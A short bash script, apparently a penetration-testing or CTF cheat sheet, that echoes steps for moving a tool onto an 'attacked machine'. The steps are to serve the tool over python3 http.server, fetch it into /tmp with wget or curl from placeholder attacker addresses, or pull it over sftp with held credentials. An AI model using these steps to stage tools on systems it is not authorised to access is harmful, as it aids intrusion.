#!/bin/bash

echo "Transfer a file/tool from local host to remote host"
echo "	1.1) set up a webserver where you have your file/tool on you local host, so it can be downloaded: python3 -m http.server <port>"
echo "	1.2) use either curl or wget from remote host to your local host to get the file. Remember to be in the /tmp folder on the attacked machine."
echo "	  wget <local-ip>:<port>/<file-name>"
echo "	  curl <local-ip>:<port>/<file-name>"
echo ""
echo "If you have ssh privileges or credentials you can simply use sftp. Assuming you are on the remote host, this is the command:"
echo "	1) sftp -i <ssh-identity-file>@<remote-host>"
echo "	2) Use get (or put) on a file to transfer it."
